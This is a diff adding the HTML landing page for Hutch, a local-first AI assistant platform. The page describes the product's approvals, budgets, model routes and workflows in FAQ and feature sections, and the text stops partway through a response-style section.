@@ -1,0 +1,980 @@
+<!doctype html>
+<html lang="en" data-theme="hutch">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Hutch — local-first AI assistants that run on your machine</title>
+  <meta name="description" content="Hutch is a local-first, MIT-licensed platform for personal AI assistants that run on your own Linux computer. You choose the models, and assistants ask before important actions. Private preview.">
+  <meta name="theme-color" content="#080c12">
+  <meta property="og:title" content="Hutch — local-first AI assistants that run on your machine">
+  <meta property="og:description" content="Personal AI assistants that run on your own computer, with the models you choose and approvals before important actions. Local-first, MIT-licensed, private preview.">
+  <meta property="og:type" content="website">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M16 2 28 9v14L16 30 4 23V9z' fill='none' stroke='%2334d399' stroke-width='2.5'/%3E%3Ccircle cx='16' cy='16' r='4' fill='%2334d399'/%3E%3C/svg%3E">
+  <link rel="preload" href="assets/fonts/archivo-latin-var.woff2?v=e3a28ead" as="font" type="font/woff2" crossorigin>
+  <link rel="stylesheet" href="tokens.css?v=2d78c988">
+  <link rel="stylesheet" href="app.css?v=f577543e">
+    <link rel="stylesheet" href="styles.min.css?v=8396aaee">
+  <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "SoftwareApplication",
+    "name": "Hutch",
+    "description": "Hutch is a local-first, MIT-licensed platform for personal AI assistants that run on your own Linux computer. You choose the models and connected apps; assistants ask for approval before important actions, usage limits are enforced with estimated budgets, and every run keeps a verifiable transcript stored locally. Private preview.",
+    "applicationCategory": "ProductivityApplication",
+    "operatingSystem": "Linux",
+    "softwareVersion": "0.1.0",
+    "license": "https://opensource.org/licenses/MIT",
+    "isAccessibleForFree": true,
+    "featureList": [
+      "Named AI assistants, each with its own model, tools, schedule, memory and workspace",
+      "Ask-first approvals with hard-denied shell command classes and a cross-assistant pending queue",
+      "Local or hosted model routes: Ollama, llama.cpp, LM Studio, OpenAI, Anthropic, OpenRouter, OpenAI-compatible and OpenCode",
+      "Estimated spend ceilings, usage reservations and run budgets",
+      "Hash-verified transcripts and locally stored, versioned document files",
+      "Recurring tasks with IANA-timezone schedules that catch up after sleep"
+    ],
+    "dateModified": "2026-10-24"
+  }
+  </script>
+  <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "What is Hutch?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Hutch is a local-first, MIT-licensed platform for personal AI assistants (called bots in its command-line tools) that runs on your own Linux computer, not in a vendor’s cloud. You start with a conversation, turn work you repeat into a named assistant with its own model, tools, schedule and memory, and connect only the apps you choose. Assistants ask for your approval before important actions, spend limits are enforced with estimated budgets, and every run keeps a verifiable transcript on your machine. Hutch is currently a private preview: there is no public download yet, and it needs a Linux host plus a model route you configure yourself."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Is Hutch free?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Yes — the software itself is free. Hutch is MIT-licensed with no subscription, hosted tier or usage fees of its own. A hosted model route uses your own provider account and pays that provider’s prices; a local model costs only what your hardware runs. Hutch estimates and reserves usage before hosted calls, but provider billing stays authoritative."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "How is Hutch different from other AI assistants?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "The difference is where the work runs and who stays in control. Hosted agent products give each agent a computer in the vendor’s cloud; Hutch runs on your machine, so conversations, memory, logs and files stay in one directory you control. Self-hosted chat interfaces such as Open WebUI front the models you already have; Hutch adds named assistants with their own tools, schedules, memory and approval rules on top. OpenClaw, the open-source personal-assistant neighbour, is designed for broad access through the chat apps you use; Hutch is governed by default — ask-first approvals, hard-denied shell command classes, estimated spend ceilings, and hash-verified transcripts and documents. Whether Hutch fits you depends on your setup: it needs a Linux computer today and a model route you configure yourself."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Do I need an API key, a credit card, or a GPU?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Hutch does not include hosted inference. Connect OpenCode with a provider account, use a compatible hosted provider, or run a local model service you already control; available models vary, and live paid-provider checks have not been performed for this preview."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Can I choose how Hutch answers?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Yes. Set voice (Direct, Warm, or Dry Wit), answer depth (Auto, Brief, Standard, or Detailed), and humor (Off, Subtle, or Playful) independently. Humor defaults to off. The fixed examples above use written sample text and make no model request; changing a setting also makes no request. If you choose the separate live preview, Hutch shows a local one-response estimate first and uses a fictional prompt without your conversation, tools, skills, or workspace. Style guides wording and cannot change permissions, approvals, evidence, spending, requested formats, or recipients. Provider adherence and live answer quality remain unverified."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Can Hutch look at an image I attach?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Yes, with limits. Hutch chat accepts PNG, JPEG or WebP attachments — up to 4 images of 1.5 MB each — and staged images stay in the conversation’s workspace on your machine, travelling with every message until you remove them. Built-in runtimes need a vision-capable model route; a send that route cannot receive is refused before a run starts. On the OpenCode runtime, verified copies are staged inside the run’s own workspace and the chosen model’s image support is checked before the model runs — a text-only model is refused with the model named. The Vision focus option tunes context handling; it is not what enables image input."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What happens to files Hutch makes for me?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "They are kept on your machine in Hutch’s own document store, not in a temporary session that expires. Every download is checked against its recorded size and SHA-256 before it is served, revisions create new versions while older versions stay downloadable, and previews are labelled as extracted content or approximate renders rather than pretending to be the exact file."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What actually leaves my machine?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Hutch stores its control state locally. A hosted model receives the prompt and context Hutch sends to it; network tools connect to their own destinations. A local model can still use online tools. Review the selected connection and tools before running a task."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Can I use different models for different kinds of work?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Yes. Assign exact provider/model routes to task roles such as summarization, code analysis or verification, then choose a role for one chat message. Hutch checks the selected route's setup, context fit and spending policy before it starts. Fallbacks handle unavailable routes; escalation handles repeated quality failures. Automatic classification is not enabled, and a role name is not a model-quality guarantee."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Will Hutch summarize my chat automatically?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Hosted summaries ask first by default and have their own estimate and budget reservation. You can explicitly opt into automatic summaries or turn them off. Hutch keeps the original conversation and stops if a summary does not reduce the context enough."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What happens when my laptop sleeps on a schedule?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Nothing runs while the machine is off. With the local supervisor running again, configured schedules detect missed windows and either coalesce them into one catch-up run or record a skip, according to the bot’s policy."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "How do Suggest and Auto work for workflows?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "New assistants start in Suggest. The setting is stored per conversation, and changing it never starts work. A chat route card and Auto start require selector qualification for the exact active model profile; the two local profiles tested did not qualify. Auto can start only a matching activated saved method within explicit limits. It does not create a new plan, and consequential actions still need separate approval."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Can a local model design or choose a workflow?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Author and selector authority depends on evidence for the exact model and execution settings. Neither of the two Qwen3 profiles tested qualified for authoring or selection. Hutch does not silently switch to another provider. You can still start a saved workflow when its required model roles are qualified for your route."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What happens if I stop a workflow or Hutch restarts?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "A pause request does not cancel active work: the current node and owned child work settle before the next step is held. If the run is already parked, it pauses immediately. Pending questions remain answerable, and no downstream step starts until you resume it from the same chat. Stop cancels work owned by that workflow and keeps its status visible until cleanup is verified. After a restart, settled steps and completed effect receipts are reused; if an external effect is uncertain, Hutch holds retry for reconciliation. Some recovery paths remain under evaluation in this private preview."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What is the difference between a workflow and a routine?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "A workflow describes the steps to do; a routine decides when work runs. Saving or importing still starts nothing. After you activate a saved workflow, you can link it to an existing routine; Hutch pins the exact revision and checks its inputs. The routine stays off until you enable it separately. Run now starts that pinned workflow once without moving the next scheduled occurrence. The local supervisor and host must be running when the routine is due."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Can I hand coding work to OpenCode?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Yes. Connect a provider in Hutch's private profile, then choose an OpenCode model for a managed assistant. Hutch brokers each permission through its approval queue and reserves usage before the prompt; it never grants OpenCode's persistent always decision. Approved shell and edit actions still run with your Linux account's authority, not inside Hutch's built-in bubblewrap sandbox. A separate experimental CLI handoff can also turn a completed Hutch answer into a reviewed coding task in a pinned worktree. Run hutch code login once for that handoff; it creates a separate worktree from the selected Git commit, and its provider usage and command approvals remain outside Hutch's budget and sandbox."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Can I run it on my ChatGPT or Claude subscription?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "OpenCode can connect a provider through an API key or a sign-in method its installed server reports, inside a private profile managed by Hutch; it does not import your regular OpenCode profile. Hutch reserves usage before the prompt and settles the provider-reported totals. OpenCode Go is also available as a user-supplied API key route. Sign in with ChatGPT is an opt-in local-app preview; eligibility for Hutch is unconfirmed and its Responses API does not enforce Hutch's output-token allowance. Scheduled or coordinator-assigned work needs your express permission for each Bot and connected account; the permission follows that Bot's current provider routes and can be revoked. Hutch never reuses consumer-app cookies or sessions, and no plan is silently upgraded or selected as a fallback."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What does a runaway bot cost me?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Set a warning, an approval pause, and an estimated admission ceiling independently. For OpenRouter, a strict USD ceiling requires fresh endpoint pricing; Hutch blocks if it cannot quote an eligible route. Estimates can differ from the provider’s invoice and are not an external spending guarantee, so use provider-side billing limits as well. Uncertain charges remain held until reconciled."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Can I review cost and context before sending?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Studio can estimate the selected route, your current draft, the bounded recent conversation context and the applicable spend policy before you send. It is a preview: context can change before admission, and providers control final tokenization and billing."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Is it safe to let an agent touch my files?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Bubblewrap isolation is available only on Linux and must be enabled; it is not a virtual machine. Approval policy and transcripts provide operator control but do not guarantee safe decisions. Legacy bots may still have isolation disabled. Read the support boundaries above before use."
+        }
+      }
+    ]
+  }
+  </script>
+  <noscript>
+    <style>.navbar-center{display:flex !important}.menu-btn{display:none !important}</style>
+  </noscript>
+</head>
+<body class="bg-base-100 font-body text-ink antialiased">
+  <a class="skip-link" href="#main">Skip to content</a>
+
+  <header class="sticky top-0 z-50 border-b border-line-soft bg-base-100/95 backdrop-blur">
+    <div class="navbar mx-auto min-h-[68px] w-full max-w-[1160px] gap-4 px-5 sm:px-6">
+      <div class="navbar-start">
+        <a class="flex items-center gap-2.5 text-ink" href="#top" aria-label="hutch home">
+          <svg class="size-[26px]" viewBox="0 0 32 32" aria-hidden="true">
+            <path d="M16 2 28 9v14L16 30 4 23V9z" fill="none" stroke="var(--color-semantic-brand)" stroke-width="2.5"/>
+            <circle cx="16" cy="16" r="4" fill="var(--color-semantic-brand)"/>
+          </svg>
+          <span class="text-xl font-extrabold tracking-tight">hutch<span class="text-brand">.</span></span>
+        </a>
+      </div>
+      <div class="navbar-center">
+        <ul class="menu menu-horizontal gap-1 px-1 text-xs font-semibold">
+          <li><a class="text-ink-2 hover:text-ink" href="#proof">Product tour</a></li>
+          <li><a class="text-ink-2 hover:text-ink" href="#workflow">How it helps</a></li>
+          <li><a class="text-ink-2 hover:text-ink" href="#runs">Models &amp; data</a></li>
+          <li><a class="text-ink-2 hover:text-ink" href="#control">Approvals &amp; limits</a></li>
+          <li><a class="text-ink-2 hover:text-ink" href="#get">Availability</a></li>
+          <li><a class="text-ink-2 hover:text-ink" href="#faq">FAQ</a></li>
+        </ul>
+      </div>
+      <div class="navbar-end gap-2">
+        <a class="btn btn-primary btn-sm" href="#proof">See the app</a>
+        <button class="menu-btn btn btn-ghost btn-square lg:hidden" id="menu-btn" type="button" aria-label="Open menu" aria-expanded="false" aria-controls="menu-drawer" aria-haspopup="dialog">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <dialog id="menu-drawer" class="drawer" aria-labelledby="drawer-title" closedby="any">
+    <div class="drawer-head wrap">
+      <span class="flex items-center gap-2.5 text-ink" aria-hidden="true">
+        <svg class="size-[22px]" viewBox="0 0 32 32"><path d="M16 2 28 9v14L16 30 4 23V9z" fill="none" stroke="var(--color-semantic-brand)" stroke-width="2.5"/><circle cx="16" cy="16" r="4" fill="var(--color-semantic-brand)"/></svg>
+        <span class="text-xl font-extrabold tracking-tight">hutch<span class="text-brand">.</span></span>
+      </span>
+      <button class="btn btn-outline btn-sm" id="drawer-close" type="button">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>
+        Close
+      </button>
+    </div>
+    <h2 id="drawer-title" class="visually-hidden">Site menu</h2>
+    <nav class="drawer-links" aria-label="Sections, mobile">
+      <a href="#proof">Product tour</a>
+      <a href="#receipts">Everyday help</a>
+      <a href="#workflow">How it helps</a>
+      <a href="#runs">Models &amp; data</a>
+      <a href="#control">Approvals &amp; limits</a>
+      <a href="#cases">Examples</a>
+      <a href="#get">Availability</a>
+      <a href="#faq">FAQ</a>
+    </nav>
+    <div class="drawer-foot wrap">
+      <a class="btn btn-primary" href="#get">Check availability</a>
+    </div>
+  </dialog>
+
+  <main id="main">
+  <!-- ================================================================= HERO -->
+  <section class="hero" id="top">
+    <div class="wrap hero-grid">
+      <div class="hero-copy">
+        <p class="hero-eyebrow"><span class="hero-eyebrow-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M12 2.8v5.1m0 8.2v5.1m9.2-9.2h-5.1m-8.2 0H2.8m15.7-6.5-3.6 3.6m-5.8 5.8-3.6 3.6m13 0-3.6-3.6m-5.8-5.8L5.5 5.5"/></svg></span> Local-first AI assistants · run on your own machine</p>
+        <h1 class="hero-title">A little help with what&rsquo;s next.</h1>
+        <p class="hero-sub">Hutch is a local-first assistant platform that runs on your own computer. Start with a conversation, turn work you repeat into a named assistant, and review every important action before it happens.</p>
+        <div class="hero-actions">
+          <a class="btn btn-primary" href="#proof">See the app</a>
+          <a class="btn btn-outline" href="#get">Check availability</a>
+        </div>
+        <ul class="hero-promises" aria-label="What you can expect">
+          <li><span class="promise-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 11.5a7.5 7.5 0 0 1-8 7.5 8.8 8.8 0 0 1-3.3-.6L4 20l1.4-3.8A7.2 7.2 0 0 1 4 11.5 7.5 7.5 0 0 1 12 4a7.5 7.5 0 0 1 8 7.5Z"/><path d="M8 11h8M8 14h5"/></svg></span>Chats and files stay on your computer</li>
+          <li><span class="promise-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3.5" y="4" width="7" height="7" rx="2"/><rect x="13.5" y="4" width="7" height="7" rx="2"/><rect x="3.5" y="14" width="7" height="7" rx="2"/><rect x="13.5" y="14" width="7" height="7" rx="2"/></svg></span>You choose the models and apps</li>
+          <li><span class="promise-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m12 3 8 3v5c0 4.6-3.2 7.8-8 10-4.8-2.2-8-5.4-8-10V6l8-3Z"/><path d="m8.5 12 2.2 2.2 4.8-4.8"/></svg></span>Assistants ask before important actions</li>
+        </ul>
+      </div>
+      <div class="hero-figure" role="img" aria-label="Illustration: ask Hutch for help, then choose what happens">
+        <div class="hero-scene" aria-label="Illustration: ask Hutch for help, then choose what happens">
+          <div class="hero-note hero-note-task">
+            <span class="hero-note-icon calendar-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="16" rx="3"/><path d="M7 3v4m10-4v4M3 10h18"/><path d="m8 15 2.2 2.2L16 12"/></svg></span>
+            <span><b>Help me plan my week</b><small>Example request</small></span>
+          </div>
+          <div class="hero-mascot" id="agent" data-frames="assets/agent/f" data-cols="7" data-rows="3">
+            <img class="weave-agent" src="assets/hutch-agent.webp?v=da73ea5e" width="560" height="680"
+                 decoding="async" fetchpriority="high" alt="">
+          </div>
+          <div class="hero-note hero-note-review">
+            <span class="hero-note-icon review-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m12 3 8 3v5c0 4.6-3.2 7.8-8 10-4.8-2.2-8-5.4-8-10V6l8-3Z"/><path d="m8.5 12 2.2 2.2 4.8-4.8"/></svg></span>
+            <span><b>You stay in control</b><small>Review when needed</small></span>
+          </div>
+        </div>
+        <p class="hero-caption">One conversation to get started. More detail when you want it.</p>
+      </div>
+  </section>
+
+  <!-- ================================================================ PROOF -->
+  <section class="band" id="proof">
+    <div class="wrap">
+      <div class="section-head">
+        <h2 class="section-heading">Start by saying what you need.</h2>
+        <p class="section-desc">The real Hutch app opens with a simple request beside the AI service already available, or the next way to connect one. It carries your words into assistant setup, suggests a name you can change, and keeps the advanced choices for when you want them.</p>
+      </div>
+      <figure class="proof-figure">
+        <div class="proof-chrome">
+          <span class="win-dots" aria-hidden="true"><i></i><i></i><i></i></span>
+          <span class="proof-label">A fresh start in Hutch</span>
+          <span class="badge badge-outline"><span class="dot dot-ok" aria-hidden="true"></span>Real application</span>
+        </div>
+        <div class="proof-body">
+          <picture class="proof-picture">
+            <source media="(max-width: 640px)" srcset="assets/captures/setup-phone.webp?v=44839b31" width="390" height="1200">
+            <img class="proof-img" src="assets/captures/setup-desktop.webp?v=c1a4263f" width="1440" height="1000" loading="lazy" decoding="async"
+                 alt="The actual Hutch welcome screen. A person can describe a request, see whether OpenCode or another AI service is ready, and set up an assistant without repeating the request.">
+          </picture>
+          <figcaption class="proof-legend">
+            <ol>
+              <li><b>Say what you need.</b> Your first message becomes the starting point.</li>
+              <li><b>Know what powers it.</b> Hutch shows the ready AI service and carries that choice into setup.</li>
+              <li><b>Keep the final say.</b> Important actions come back to you for review.</li>
+            </ol>
+            <p class="proof-meta">Captured from the current local application on 2026-10-23, using a desktop viewport and an extended 390 by 1200 phone viewport to show the full setup panel. The temporary account was empty; no provider call or external action was made.</p>
+          </figcaption>
+        </div>
+      </figure>
+    </div>
+  </section>
+
+  <!-- =========================================================== EVERYDAY HELP -->
+  <section class="section" id="receipts">
+    <div class="wrap">
+      <div class="section-head">
+        <h2 class="section-heading">Make room for the work you actually care about.</h2>
+        <p class="section-desc">Start with a small request. Keep a helper for work you return to, connect the apps you choose, and stay part of decisions that matter.</p>
+      </div>
+      <div class="benefit-grid">
+        <article class="benefit-card">
+          <div class="benefit-art benefit-art-chat" aria-hidden="true"><span class="benefit-orbit"></span><svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M38 23.5a15 15 0 0 1-16 15 17.6 17.6 0 0 1-6.6-1.2L6 40l2.8-7.6A14.4 14.4 0 0 1 6 23.5a15 15 0 0 1 16-15 15 15 0 0 1 16 15Z"/><path d="M15 22h14m-14 6h9"/></svg><span class="benefit-spark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M12 2.8v5.1m0 8.2v5.1m9.2-9.2h-5.1m-8.2 0H2.8m15.7-6.5-3.6 3.6m-5.8 5.8-3.6 3.6m13 0-3.6-3.6m-5.8-5.8L5.5 5.5"/></svg></span></div>
+          <div class="benefit-copy"><h3>Start with what you meant</h3><p>Say it once in chat. If you turn the request into a dedicated helper, Hutch carries it into setup and suggests a short name you can change.</p><span class="example-prompt">“Help me keep track of the follow-ups.”</span></div>
+        </article>
+        <article class="benefit-card">
+          <div class="benefit-art benefit-art-apps" aria-hidden="true"><span class="app-mark calendar-mark" data-service-category="calendar"><svg data-icon="calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="16" rx="2"/><path d="M16 3v4M8 3v4M3 11h18"/></svg></span><span class="app-mark mail-mark" data-service-category="gmail"><svg data-icon="mail" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg></span><span class="app-mark outlook-mark" data-service-category="outlook"><svg data-icon="inbox" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-6l-2 3h-4l-2-3H2"/><path d="M5.45 5.11 2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/></svg></span></div>
+          <div class="benefit-copy"><h3>Bring the apps you choose</h3><p>Connect calendar, email, and AI services where available. You choose which helpers can use each account and can change access later.</p><span class="example-prompt">Calendar · Gmail · Outlook · your AI</span></div>
+        </article>
+        <article class="benefit-card">
+          <div class="benefit-art benefit-art-review" aria-hidden="true"><span class="review-sheet"><svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m24 5 15 6v9c0 8.6-6 14.6-15 19-9-4.4-15-10.4-15-19v-9l15-6Z"/><path d="m17.5 22 4.2 4.2L31 17"/></svg></span><span class="review-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.25" stroke-linecap="round" stroke-linejoin="round"><path d="m5 12.5 4.4 4.4L19 7.8"/></svg></span></div>
+          <div class="benefit-copy"><h3>Know when to step in</h3><p>Hutch can pause before an action that needs your say. Review what it wants to do, then allow it once or say no. When several wait, the soonest deadline and risk come first.</p><span class="example-prompt">Your choice stays yours.</span></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================ WORKFLOW -->
+  <section class="band" id="workflow">
+    <div class="wrap">
+      <div class="section-head">
+        <h2 class="section-heading">Turn one conversation into help you can return to.</h2>
+        <p class="section-desc">Chat with Hutch in everyday language. When a kind of work comes up again, give it a name and a place of its own.</p>
+      </div>
+      <ol class="workflow-steps">
+        <li class="card step-card">
+          <div class="card-body step-body">
+            <span class="step-n" aria-hidden="true">01</span>
+            <h3 class="text-lg font-bold tracking-tight">Say what you need</h3>
+            <p>Start in chat. If you turn a request into a dedicated assistant, Hutch carries your words into setup, suggests an editable name, and lets you create it without describing the work again.</p>
+          </div>
+        </li>
+        <li class="card step-card">
+          <div class="card-body step-body">
+            <span class="step-n" aria-hidden="true">02</span>
+            <h3 class="text-lg font-bold tracking-tight">Choose what happens next</h3>
+            <p>If Hutch needs your preference, it can offer clear choices right in chat. Your reply guides the conversation; it never approves an action. Review an approval in the chat or Needs you, then allow once or say no.</p>
+          </div>
+        </li>
+        <li class="card step-card">
+          <div class="card-body step-body">
+            <span class="step-n" aria-hidden="true">03</span>
+            <h3 class="text-lg font-bold tracking-tight">Come back to the result</h3>
+            <p>Find the answer and what Hutch did in the same conversation. Keep useful work nearby, share only the background you choose, and return to repeat requests when you need them.</p>
+          </div>
+        </li>
+      </ol>
+      <div class="workflow-explanations" aria-label="More about each step">
+            <details class="page-details workflow-details">
+              <summary>Customize the assistant when you want to</summary>
+              <div class="details-copy">
+                <p><b>New</b> can start from the latest request in the current chat. Hutch suggests an editable teammate name, clear work role and stable local address without an extra model request. With a saved workspace or source-chat model route, setup stays on one screen and creating the assistant starts no run. Without a configured route, Hutch asks you to choose one.</p>
+                <p><b>Customize</b> opens model, workspace, tools, memory, schedule and limit settings. Only the selected request and earlier user messages you choose become saved background; later messages, assistant replies and other chats stay excluded. New assistants start in a managed workspace with no tools or schedule and ask before actions that require approval.</p>
+                <p><b>Experimental (built-in coordinator only):</b> request a tool-free purpose rewrite from the exact source; each request returns one response. Select earlier user messages if useful. Edit and apply the draft yourself; it lists unknowns rather than guessing. Drafting creates no assistant or permission changes. Normal route and fallback limits still apply; hosted providers may retain the text, and live quality is unverified.</p>
+              </div>
+            </details>
+            <details class="page-details workflow-details">
+              <summary>How assistant handoffs and checkpoints work</summary>
+              <div class="details-copy">
+                <p><b>Experimental coordinator handoff:</b> only assistants on the owner-approved roster can receive a new task. Manage that list in coordinator settings, then review the specialist's saved settings, refine the goal and optional deliverable or constraints, and confirm. The coordinator chat keeps the original request, task, response and content-free progress timeline together; changing the roster never stops existing work.</p>
+                <p>Continue only from a safe checkpoint: the failed or stopped built-in attempt has no recorded action or child work, and no later specialist work, pending question or uncertain effect; the coordinator chat and specialist settings must remain active and unchanged. Hutch starts a fresh run from the reviewed brief, constraints and committed response; it never resumes the old worker or replays actions. External runtimes stay blocked, and a new model call may use more quota.</p>
+                <p>Attach only the exact specialist reply you choose, as untrusted text; other chat history, files and permissions stay separate. You may also select up to eight current, approved coordinator facts for that task alone. They are not specialist memory; providers may retain submitted copies. The specialist's own memory and workspace may apply. Live provider execution is unverified.</p>
+              </div>
+            </details>
+            <details class="page-details workflow-details">
+              <summary>More about history, files, and memory</summary>
+              <div class="details-copy">
+                <p>Inspect the final status, tool results, ordered transcript and reported usage. The Chat library can find active, archived, and imported conversation titles across assistants; message search stays focused on active chats. Uncertain effects remain visible for reconciliation. Keep memory private by default. If another assistant needs a fact, share the reviewed snapshot with that named assistant. Either side can revoke; the share adds no tools, account access or workspace context.</p>
+                <p>Workspace settings hold defaults for assistants you create and the optional motion preference. Existing assistants and chats retain their saved choices.</p>
+                <p>For repeat work, save a reviewed request in Hutch&rsquo;s local library and search for it from another chat. Choosing one fills a draft only; you still review and send it yourself.</p>
+                <p>Documents Hutch creates &mdash; PDF, DOCX, XLSX, PPTX, CSV, JSON, Markdown or a ZIP bundle &mdash; are stored on your machine as versioned files with recorded SHA-256 hashes. Downloads come straight from that local store, so a file does not expire with the chat that made it, and each preview says whether it is the extracted content or an approximate render.</p>
+              </div>
+            </details>
+      </div>
+
+      <aside class="workflow-preview" aria-labelledby="workflow-preview-title">
+        <div class="workflow-preview-copy">
+          <p class="workflow-preview-status"><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Private preview</span><span>Saved steps, started by you</span></p>
+          <h3 id="workflow-preview-title">Keep a multi-step plan and its progress in the same chat.</h3>
+          <p>Review and start saved workflows in chat. Planned steps stay distinct from discovered instances; answer each pending question. Pause lets active work settle before the next step is held. Resume or stop from chat. A completed step is not necessarily verified.</p>
+          <p class="workflow-preview-limit">Chat route cards and Auto require a qualified selector for the exact model profile; neither tested local profile qualified. Auto does not create new plans. An owner can link an activated workflow to a routine; enabling stays separate.</p>
+        </div>
+        <a class="btn btn-outline workflow-preview-link" href="#faq">Workflow questions</a>
+      </aside>
+
+      <div class="response-style-showcase" id="response-style">
+        <div class="response-style-top">
+          <div class="response-style-copy">
+            <span class="response-style-kicker">Optional response style</span>
+            <h3>Choose the voice. Set the depth separately.</h3>
+            <p>Pick Direct, Warm, or Dry Wit for the voice. Choose Auto, Brief, Standard, or Detailed for how much explanation you want. Humor has its own Off, Subtle, or Playful setting.</p>
+            <dl class="response-style-choices">
+              <div><dt>Voice</dt><dd>Direct · Warm · Dry Wit</dd></div>
+              <div><dt>Depth</dt><dd>Auto · Brief · Standard · Detailed</dd></div>
+              <div><dt>Humor</dt><dd>Off · Subtle · Playful</dd></div>
+            </dl>
+            <p class="response-style-boundary"><strong>Style limits:</strong> Humor defaults to off. Style changes wording only; tools, evidence, permissions, approvals, spending, requested formats, and recipients keep their existing rules.</p>
+          </div>
+          <figure class="response-style-capture">
+            <picture>
+              <source media="(max-width: 640px)" srcset="assets/captures/response-style-phone.webp?v=434f6349" width="340" height="544">
+              <img src="assets/captures/response-style-desktop.webp?v=0449d538" width="586" height="383" loading="lazy" decoding="async" alt="Hutch assistant settings showing separate Warm voice, Detailed answer depth, and Off humor controls">
+            </picture>
+            <figcaption>The real local settings screen, captured with a fictional assistant and no model request.</figcaption>
+          </figure>
+        </div>
+
+        <div class="response-style-samples">
+          <div class="response-style-sample-head">
+            <div>
+              <span class="response-style-kicker">Fixed written examples</span>
+              <h4>One request, three voices.</h4>
+            </div>
+            <p>These examples are authored text, not generated previews.</p>
+          </div>
